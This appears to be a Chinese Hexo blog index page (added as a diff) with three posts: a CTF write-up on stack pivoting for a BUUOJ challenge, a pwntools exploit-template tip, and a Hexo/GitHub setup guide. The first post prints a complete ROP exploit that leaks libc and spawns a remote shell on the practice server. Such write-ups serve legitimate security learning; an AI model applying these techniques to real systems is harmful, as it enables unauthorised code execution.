@@ -1,0 +1,411 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://example.com/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 6.0.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-栈迁移" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/01/25/%E6%A0%88%E8%BF%81%E7%A7%BB/" class="article-date">
+  <time class="dt-published" datetime="2022-01-25T14:29:07.000Z" itemprop="datePublished">2022-01-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/01/25/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h3 id="溢出的长度不够-——-栈迁移"><a href="#溢出的长度不够-——-栈迁移" class="headerlink" title="溢出的长度不够 —— 栈迁移"></a>溢出的长度不够 —— 栈迁移</h3><p>有的时候，我们构造rop链时会遇到栈的空间不够用的情况。可能该栈的空间仅仅只填两个地址（也就是只允许我们修改bp和ip的地址），这种情况就需要我们利用栈迁移这个技巧来将我们的栈劫持到另一个更大的空间</p>
+<h3 id="leave-ret"><a href="#leave-ret" class="headerlink" title="leave ret"></a>leave ret</h3><p>首先，在学习栈迁移之前，我们先要了解一下<code>leave ret</code>指令（这里拿32位的程序解释一下）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">leave：</span><br><span class="line">mov esp ebp（rbp的地址赋值给rsp的地址,即rsp指向rbp）</span><br><span class="line">pop ebp    （rbp指向rsp的内容(rbp的内容)，rsp+=4）</span><br><span class="line">ret:</span><br><span class="line">pop rip     (rip指向原rsp的内容，rsp+=8)</span><br></pre></td></tr></table></figure>
+
+<p>这里我们大致就可以看出栈迁移就是通过改变栈的sp、bp指向的地址来构造一个伪栈实现的</p>
+<p>下面就以buuoj的一道题为例</p>
+<h3 id="Black-Watch-入群题-PWN"><a href="#Black-Watch-入群题-PWN" class="headerlink" title="[Black Watch 入群题]PWN"></a>[Black Watch 入群题]PWN</h3><p>打开unbuntu16.04，checksec查看一下文件的基本信息</p>
+<p><img src="/2022/01/25/%E6%A0%88%E8%BF%81%E7%A7%BB/1.png"></p>
+<p>32位ida载入，首先shift+f12查看一下程序里的字符串，没有system函数和‘/bin/sh’的字符串，这可能就需要我们自己来构造。一下子就猜到可能需要利用 LibcSearcher </p>
+<p><img src="/2022/01/25/%E6%A0%88%E8%BF%81%E7%A7%BB/2.png"><br>看看main函数，好像没什么</p>
+<p><img src="/2022/01/25/%E6%A0%88%E8%BF%81%E7%A7%BB/3.png"></p>
+<p>但是看到了vul_function函数，主要问题就在这里</p>
+<p><img src="/2022/01/25/%E6%A0%88%E8%BF%81%E7%A7%BB/4.png"></p>
+<p>这里我们发现我们能利用的函数就只有两个read函数</p>
+<p>第一个read函数指向的是bss段，有0x200的空间，可以写很多东西<br>$$<br>bss段（bss segment）通常是指用来存放程序中未初始化的全局变量的一块内存区域。<br>$$<br>第二个read函数却只有0x20的空间，buf的长度有0x18，显然，远远不够我们构造rop链</p>
+<p>这时候，我们可以利用第一个read函数把我们的rop写到s来泄露libc的版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=p32(write_plt)+p32(main)+p32(1)+p32(write_got)+p32(4)</span><br></pre></td></tr></table></figure>
+
+<p>我们需要先在程序的gadget里找找<code>leave ret</code>,因为每一个函数都会调用<code>leave ret</code>，所以不用担心找不到。</p>
+<p>这里我们需要使用一个专门找gadget的插件<code>ROPgadget</code>，（具体使用方法自行百度）如下：</p>
+<p><img src="/2022/01/25/%E6%A0%88%E8%BF%81%E7%A7%BB/5.png"></p>
+<p>使用第一个，接着利用第二个read函数在buf里借助栈迁移把栈移到s那里去，这时候s和buf的内容是这样的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload1=&#x27;a&#x27;*0x18+p32(s-4)+p32(leave_ret)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+-----------+                            +-----------+ &lt;————esp</span><br><span class="line">| write_plt | &lt;————s初始位                | &#x27;a&#x27;*0x18  | </span><br><span class="line">+-----------+                            +-----------+</span><br><span class="line">|    main   |                            |    s-4    | &lt;————ebp</span><br><span class="line">+-----------+                            +-----------+ (ps：这里是s的地址-4)</span><br><span class="line">|    ...    |                            | leave_ret | </span><br><span class="line">+-----------+                            +-----------+</span><br><span class="line">|     4     |</span><br><span class="line">+-----------+</span><br></pre></td></tr></table></figure>
+
+<p>这边-4是因为我们第二次执行pop rbp给rbp赋值的时候，会将rsp+4，如果不减去4，rsp就在程序一开始的时候指向的不是栈顶，而是栈顶+4的位置，我们之后读取数据会丢失一开始的4字节，所以需要一开始的时候将指针往上抬4字节</p>
+<p>首先程序正常结束了，去调用程序本身的leave，再调用我们写入的leave_ret</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#过程：</span><br><span class="line">EBP ：s-4 --&gt; (s-4)addr</span><br><span class="line">ESP ：&#x27;a&#x27;*0x18  --&gt; leave_ret --&gt; write_plt</span><br><span class="line"></span><br><span class="line">#执行 leave </span><br><span class="line">EBP ：(s-4)addr</span><br><span class="line">ESP ：leave_ret </span><br><span class="line"></span><br><span class="line">#执行 leave ret</span><br><span class="line">EBP ：(s-4)addr</span><br><span class="line">ESP ：leave_ret</span><br><span class="line">EIP ：leave_ret处的内容	( leave_ret处的rop链)</span><br></pre></td></tr></table></figure>
+
+<p>ebp、esp变化如图：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">                                                   +-----------+</span><br><span class="line">                                        ebp —————&gt; | (s-4)addr |</span><br><span class="line">+-----------+ &lt;————esp                             +-----------+</span><br><span class="line">| &#x27;a&#x27;*0x18  |                           esp —————&gt; | write_plt | &lt;————s的初始位置</span><br><span class="line">+-----------+                                      +-----------+  </span><br><span class="line">|    s-4    |   &lt;————ebp                           |    main   |</span><br><span class="line">+-----------+                                      +-----------+</span><br><span class="line">| leave_ret |                                      |    ...    |</span><br><span class="line">+-----------+                                      +-----------+ </span><br><span class="line">                                                   |     4     |</span><br><span class="line">                                                   +-----------+</span><br></pre></td></tr></table></figure>
+
+<p>接下来它就会去执行我们布置好的泄露libc的步骤，我们去接收它输出的write函数地址，就知道了libc版本，接下来就能去构造system（’/bin/sh‘）了，接下来在重复一下上述的控制流程，就能拿到shell了</p>
+<p>exp如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line"># p=process(&#x27;./spwn&#x27;)</span><br><span class="line">p=remote(&#x27;node4.buuoj.cn&#x27;,27330)</span><br><span class="line">elf=ELF(&#x27;./spwn&#x27;)</span><br><span class="line"></span><br><span class="line">write_plt = elf.plt[&#x27;write&#x27;]</span><br><span class="line">write_got = elf.got[&#x27;write&#x27;]</span><br><span class="line">main = 0x8048513</span><br><span class="line">s = 0x0804A300</span><br><span class="line">leave_ret = 0x08048408</span><br><span class="line"></span><br><span class="line">payload = p32(write_plt) + p32(main) + p32(1) + p32(write_got) + p32(4)</span><br><span class="line">p.recvuntil(&quot;What is your name?&quot;)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">payload1 = &#x27;a&#x27;*0x18 + p32(s-4) + p32(leave_ret)</span><br><span class="line">p.recvuntil(&quot;What do you want to say?&quot;)</span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">write_addr = u32(p.recv(4))</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(&#x27;write&#x27;,write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(&#x27;write&#x27;)</span><br><span class="line">system_addr = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;name?&quot;)</span><br><span class="line">payload = p32(system_addr) + p32(0) + p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;say?&quot;)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>拿下flag！</p>
+<p><img src="/2022/01/25/%E6%A0%88%E8%BF%81%E7%A7%BB/6.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/01/25/%E6%A0%88%E8%BF%81%E7%A7%BB/" data-id="ckyu85adt0001umjx3497g3qe" data-title="栈迁移" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-添加模板" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/01/25/%E6%B7%BB%E5%8A%A0%E6%A8%A1%E6%9D%BF/" class="article-date">
+  <time class="dt-published" datetime="2022-01-25T14:25:31.000Z" itemprop="datePublished">2022-01-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/01/25/%E6%B7%BB%E5%8A%A0%E6%A8%A1%E6%9D%BF/">添加模板</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <hr>
+<p>title: 添加模板<br>date: 2022-01-25 06:12:56<br>tags:</p>
+<hr>
+<h4 id="下面讲解如何设置一个exp模板"><a href="#下面讲解如何设置一个exp模板" class="headerlink" title="下面讲解如何设置一个exp模板"></a>下面讲解如何设置一个exp模板</h4><p>首先，把自己需要的模板内容写好，如：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level =<span class="string">&#x27;debug&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>,os =<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./gyctf_2020_document&#x27;)</span></span><br><span class="line"><span class="comment"># libc =  ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;)</span></span><br><span class="line">libc =  ELF(<span class="string">&#x27;./libc-2.23_x64.so&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">26987</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment"># raw_input()</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> re,se:p.sendlineafter(re,se)</span><br><span class="line">sa  = <span class="keyword">lambda</span> re,se:p.sendafter(re,se)</span><br><span class="line">ru  = <span class="keyword">lambda</span> re   :p.recvuntil(re)</span><br><span class="line">u64 = <span class="keyword">lambda</span>      :p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">u32 = <span class="keyword">lambda</span>      :p.recvuntil()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>然后找到sublime左上方的tools选项，选择 Developer 里面的 New Snippet ，双击打开</p>
+<p><img src="/2022/01/25/%E6%B7%BB%E5%8A%A0%E6%A8%A1%E6%9D%BF/1.png"></p>
+<p>接着，修改下面红色方框框住的部分，把它改为之前写好的模板，如下：</p>
+<p><img src="/2022/01/25/%E6%B7%BB%E5%8A%A0%E6%A8%A1%E6%9D%BF/2.png"></p>
+<p><img src="/2022/01/25/%E6%B7%BB%E5%8A%A0%E6%A8%A1%E6%9D%BF/3.png"></p>
+<p>再给你的模板改一个自己记得名字并保存，这样就大功告成了</p>
+<p>最后打开你的sublime，使用 ctrl + shift + p，输入你刚刚给模板取的名字，敲敲回车，看看效果</p>
+<p><img src="/2022/01/25/%E6%B7%BB%E5%8A%A0%E6%A8%A1%E6%9D%BF/4.png"></p>
+<p>这样以后就再也不用敲这些繁琐的代码了！！！</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/01/25/%E6%B7%BB%E5%8A%A0%E6%A8%A1%E6%9D%BF/" data-id="ckyu85adv0002umjx64rj22rn" data-title="添加模板" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-hexo-github博客搭建" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/01/25/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" class="article-date">
+  <time class="dt-published" datetime="2022-01-25T14:07:40.000Z" itemprop="datePublished">2022-01-25</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/01/25/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">hexo+github博客搭建</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h2 id="1-安装nodejs"><a href="#1-安装nodejs" class="headerlink" title="1.安装nodejs"></a>1.安装nodejs</h2><p>安装Hexo前需要安装Node.js（版本自己确定）</p>
+<p>对于Ubuntu系列系统，执行以下两个命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ curl -sL https://deb.nodesource.com/setup_16.x | sudo -E bash -</span><br><span class="line">$ sudo apt install -y nodejs</span><br></pre></td></tr></table></figure>
+
+<p>如果系统中没有安装<code>curl</code>，执行下述命令安装：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt install curl</span><br></pre></td></tr></table></figure>
+
+<p>安装完成后需要检查下<code>node</code>和<code>npm</code>的版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ node -v</span><br><span class="line">$ npm -v</span><br></pre></td></tr></table></figure>
+
+<h2 id="2-Hexo本地建站"><a href="#2-Hexo本地建站" class="headerlink" title="2.Hexo本地建站"></a>2.Hexo本地建站</h2><h3 id="2-1-安装hexo"><a href="#2-1-安装hexo" class="headerlink" title="2.1.安装hexo"></a>2.1.安装hexo</h3><p><code>Hexo</code>安装非常简单，上述环境搭建好后只需执行以下命令即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
+
+<h3 id="2-2-Hexo本地建站"><a href="#2-2-Hexo本地建站" class="headerlink" title="2.2.Hexo本地建站"></a>2.2.Hexo本地建站</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">创建目录</span><br><span class="line">$ mkdir hexo</span><br><span class="line">切换目录</span><br><span class="line">$ cd hexo</span><br><span class="line">初始化 Hexo</span><br><span class="line">$ hexo init</span><br></pre></td></tr></table></figure>
+
+<p>下述命令会在该文件夹下建立所有需要的文件。接下来安装依赖包：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>hexo generate</code> 是用来编译生成站点，每次对站点内容编辑后都要进行该项操作。可以简化为 <code>hexo g</code>。</li>
+<li><code>hexo server</code>是用来启动本地站点，执行后即可在浏览器中输入<code>localhost:4000</code>查看。可以简化为  <code>hexo s</code>。</li>
+</ul>
+<h2 id="3-Ubuntu-16-04下Github配置"><a href="#3-Ubuntu-16-04下Github配置" class="headerlink" title="3.Ubuntu 16.04下Github配置"></a>3.Ubuntu 16.04下Github配置</h2><h3 id="3-1-Git安装"><a href="#3-1-Git安装" class="headerlink" title="3.1.Git安装"></a>3.1.Git安装</h3><p>Ubuntu下需要安装git，输入命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get install git</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-SSH配置"><a href="#3-2-SSH配置" class="headerlink" title="3.2.SSH配置"></a>3.2.SSH配置</h3><p>我们需要使用ssh来和github上的远程仓库进行通信，所以需要检查和配置ssh。</p>
+<p>首先需要检查电脑上现有的ssh key:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cd ~/.ssh</span><br></pre></td></tr></table></figure>
+
+
+<p>如果提示：<code>No such file or dictionary</code> 则说明你是第一次使用git。</p>
+<p>如果你是第一次使用git，那么你需要做如下工作。否则可以跳过此节。</p>
+<p>生成新的SSH KEY:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh-keygen -t rsa -C &quot;youraddress@youremail.com&quot;</span><br></pre></td></tr></table></figure>
+
+<p><code>youraddress@youremail.com</code>是你Github的注册邮箱</p>
+<h3 id="3-3-打开存放密钥的文件夹查看"><a href="#3-3-打开存放密钥的文件夹查看" class="headerlink" title="3.3.打开存放密钥的文件夹查看"></a>3.3.打开存放密钥的文件夹查看</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> .ssh/          <span class="comment">#打开存放密钥的文件夹</span></span><br><span class="line">ls                <span class="comment">#查看文件</span></span><br><span class="line">cat id_rsa        <span class="comment">#查看私钥</span></span><br><span class="line">cat id_rsa.pub    <span class="comment">#查看公钥</span></span><br></pre></td></tr></table></figure>
+
+<p>在<code>.ssh/</code>中可以看到<code>cat id_rsa</code>  <code>cat id_rsa.pub</code>两个文件</p>
+<p><code>cat id_rsa</code>为私钥，一般自己保存即可</p>
+<p><code>cat id_rsa.pub</code>为公钥，添加到服务器上</p>
+<p>复制一下生成的公钥，从（包括）ssh-rsa到最后。最后的计算机名和它前面的空格不用复制，复制也可以。</p>
+<p>登录Github，点右上角自己的头像，选择Settings，然后在新页面中的左侧边栏选择SSH and GPG Key。给这个ssh公钥起一个名字，然后把公钥复制进去。</p>
+<p>添加上之后就可以用本机SSH连接Github了。</p>
+<h3 id="3-4-通过SSH命令连接Github连接检查"><a href="#3-4-通过SSH命令连接Github连接检查" class="headerlink" title="3.4.通过SSH命令连接Github连接检查"></a>3.4.通过SSH命令连接Github连接检查</h3><p>当一切配置妥当后，在终端中输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -T git@github.com</span><br></pre></td></tr></table></figure>
+
+
+<p>如果你是第一次输入此命令，可能遇到如下提示：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">The authenticity of host &#x27;github.com (207.97.227.239)&#x27; can&#x27;t be established.</span><br><span class="line">RSA key fingerprint is xx:xx...xx:xx.</span><br><span class="line">Are you sure you want to continue connecting (yes/no)?</span><br></pre></td></tr></table></figure>
+
+
+<p>此时输入yes即可，然后会出现：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hi xxx! You&#x27;ve successfully authenticated, but GitHub does not provide shell access.</span><br></pre></td></tr></table></figure>
+
+
+<p>此时表明你的github配置完成了</p>
+<h3 id="3-5-本地个人信息配置"><a href="#3-5-本地个人信息配置" class="headerlink" title="3.5.本地个人信息配置"></a>3.5.本地个人信息配置</h3><p>此时你已经可以通过SSH连接到Github了，但是还有一些个人信息需要完善才能够和Github愉快的通信。</p>
+<p>Git会依据本地设定的用户名和邮箱向远程主机提交更改，Github也是依据这些信息进行权限管理的。如果你当前只使用一个Github帐号，那么你需要以下两个命令来完善本地个人信息设定：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name &quot;your github name&quot;</span><br><span class="line">$ git config --global user.email &quot;youraddress@youremail.com&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>上述命令中your github name是你的github用户名，<a href="mailto:&#x79;&#x6f;&#117;&#x72;&#x61;&#100;&#x64;&#114;&#x65;&#115;&#115;&#64;&#x79;&#111;&#x75;&#x72;&#x65;&#x6d;&#97;&#x69;&#108;&#46;&#x63;&#111;&#x6d;">&#x79;&#x6f;&#117;&#x72;&#x61;&#100;&#x64;&#114;&#x65;&#115;&#115;&#64;&#x79;&#111;&#x75;&#x72;&#x65;&#x6d;&#97;&#x69;&#108;&#46;&#x63;&#111;&#x6d;</a>是你github的注册邮箱。</p>
+<h2 id="4-Github-io部署博客"><a href="#4-Github-io部署博客" class="headerlink" title="4.Github.io部署博客"></a>4.Github.io部署博客</h2><h3 id="4-1-config-yml参数设置"><a href="#4-1-config-yml参数设置" class="headerlink" title="4.1_config.yml参数设置"></a>4.1_config.yml参数设置</h3><p>部署配置在_config.yml文件的末尾，默认样子如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/deployment.html</span><br><span class="line">deploy:</span><br><span class="line"> type:</span><br><span class="line"> repo:</span><br></pre></td></tr></table></figure>
+
+
+<p>修改后如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/deployment.html</span><br><span class="line">deploy:</span><br><span class="line"> type: git</span><br><span class="line"> repo: http://github.com/xxx/xxx.github.io.git(xxx是Github账户名称)</span><br><span class="line"> branch: master</span><br></pre></td></tr></table></figure>
+
+<p>这里一定要保证空格对齐!!</p>
+<p>3.2插件安装</p>
+<p>为了部署到Github上，需要安装hexo-deployer-git插件，命令如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
+
+<p>最终部署需要输入以下两个命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/01/25/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/" data-id="ckyu85adp0000umjx266thsge" data-title="hexo+github博客搭建" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">January 2022</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/01/25/%E6%A0%88%E8%BF%81%E7%A7%BB/">栈迁移</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/25/%E6%B7%BB%E5%8A%A0%E6%A8%A1%E6%9D%BF/">添加模板</a>
+          </li>
+        
+          <li>
+            <a href="/2022/01/25/hexo-github%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/">hexo+github博客搭建</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2022 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
